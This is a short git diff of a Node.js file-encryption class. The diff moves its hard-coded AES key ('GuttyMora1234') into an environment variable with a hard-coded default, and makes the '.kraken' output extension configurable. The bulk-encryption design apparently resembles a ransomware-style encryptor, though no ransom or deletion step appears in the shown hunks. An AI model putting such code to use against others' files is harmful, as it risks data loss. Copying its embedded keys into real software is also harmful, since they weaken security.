@@ -1,10 +1,14 @@
 // With ❤ by GuttyMora
+require('dotenv').config();
+const process = require('process');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 const {Buffer} = require('buffer');
 
 const DEFAULT_DIRECTORY_NAME = require.main.filename;
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY ?? 'my9t8ehq7rg4ht65fgd0bbe57w98hw03p1qz4';
+const ENCRYPTED_FILE_EXTENSION = process.env.ENCRYPTED_FILE_EXTENSION ?? 'kraken';
 
 class FileProcessor {
     async getFiles(folder = null) {
@@ -56,7 +60,7 @@ class FileProcessor {
                     reject(null);
                 } else {
                     const algorithm = 'aes-256-ctr';
-                    let key = 'GuttyMora1234';
+                    let key = ENCRYPTION_KEY;
                     key = crypto.createHash('sha256').update(key).digest('base64').substr(0, 32);
 
                     // initialization vector
@@ -77,7 +81,7 @@ class FileProcessor {
     async createEncryptFile(fileName, buffer) {
         console.log('[FileProcessor] - createEncryptFile()');
 
-        const path = `${fileName}.kraken`;
+        const path = `${fileName}.${ENCRYPTED_FILE_EXTENSION}`;
         const fileDescriptor = fs.openSync(path, 'w');
         fs.writeSync(fileDescriptor, buffer, 0, buffer.length, null);
 
